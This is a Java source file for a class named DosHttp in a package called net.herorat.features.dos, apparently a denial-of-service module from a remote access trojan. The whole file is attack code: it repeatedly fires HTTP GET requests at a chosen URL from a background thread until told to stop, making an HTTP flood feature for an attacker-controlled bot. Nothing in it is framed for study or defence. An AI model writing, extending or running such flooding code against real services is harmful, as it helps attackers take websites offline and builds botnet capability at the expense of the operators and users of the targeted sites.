package net.herorat.features.dos;

import java.net.URL;
import java.net.HttpURLConnection;

public class DosHttp implements DosInterface
{
	private String url;
	private int threads;
	private Thread dos;
	private boolean attacking;
	
	public DosHttp(String url, int threads)
	{
		this.url = url;
		this.threads = threads;
		this.attacking = false;
		
		this.dos = new Thread()
		{
			public void run()
			{
				for (int i=0; i<DosHttp.this.threads;)
				{
					if (!attacking) break;
					
					try
					{
						HttpURLConnection.setFollowRedirects(false);
						HttpURLConnection conn = (HttpURLConnection) (new URL(DosHttp.this.url)).openConnection();
						conn.setRequestMethod("GET");
						conn.getResponseCode();
						conn.disconnect();
						i++;
					}
					catch (Exception e) {}
				}
			}
		};
	}
	
	public void start()
	{
		this.attacking = true;
		this.dos.start();
	}
	
	public void stop()
	{
		this.attacking = false;
	}
}